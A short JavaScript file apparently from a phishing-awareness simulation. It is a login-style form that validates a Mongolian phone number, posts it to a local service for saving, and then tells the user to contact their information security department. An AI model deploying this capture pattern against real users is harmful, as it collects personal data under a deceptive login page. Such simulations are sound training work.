document.addEventListener('DOMContentLoaded', function() {
    const form = document.querySelector('.ant-form');
    const phoneInput = document.querySelector('input[id="phone_number"]');
    const submitButton = document.querySelector('.login-button');

    form.addEventListener('submit', function(event) {
        event.preventDefault(); // Prevent default form submission

        const phoneNumber = phoneInput.value.trim();

        // Validate phone number
        if (!phoneNumber) {
            alert('Утасны дугаар оруулна уу');
            return;
        }

        // Validate Mongolian phone number format (8 digits)
        const phoneRegex = /^[0-9]{8}$/;
        if (!phoneRegex.test(phoneNumber)) {
            alert('Утасны дугаар буруу байна');
            return;
        }

        submitButton.disabled = true;
        submitButton.innerHTML = '<span>МАБ-ын албандаа хандана уу</span>';

        // 🔥 SEND TO YOUR PYTHON SERVICE
        fetch('http://localhost:8000/write', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                text: phoneNumber
            })
        })
        .then(res => res.json())
        .then(data => {
            console.log('Saved:', data);
        })
        .catch(err => {
            console.error('Error:', err);
        })
        .finally(() => {
            submitButton.disabled = false;
        });
    });
});
